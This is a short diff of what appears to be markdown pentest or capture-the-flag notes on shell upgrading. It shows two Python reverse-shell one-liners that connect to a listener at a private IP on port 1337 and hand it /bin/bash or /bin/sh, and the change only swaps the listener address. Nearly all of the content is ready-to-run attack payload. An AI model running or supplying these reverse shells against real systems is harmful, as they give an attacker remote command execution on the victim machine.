@@ -29,11 +29,11 @@ https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
 python3 -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.2.96",1337));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
 ```
 ```shell
-python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.249.73",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.9.206",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbMjA4MzM0OTk2OCwtMTA0NTA0MDE3MiwxNj
-QwNjQ1OTMwLC0xMTcwNDY5ODUyLDIzNTI0NTIzMiwxNDYxNzQ0
-MDYsMTkzODIxMTg0NiwtMTQyNTE0MDk3LDE5MTM1OTIxOTFdfQ
-==
+eyJoaXN0b3J5IjpbNTYwMDAxNzAwLDIwODMzNDk5NjgsLTEwND
+UwNDAxNzIsMTY0MDY0NTkzMCwtMTE3MDQ2OTg1MiwyMzUyNDUy
+MzIsMTQ2MTc0NDA2LDE5MzgyMTE4NDYsLTE0MjUxNDA5NywxOT
+EzNTkyMTkxXX0=
 -->
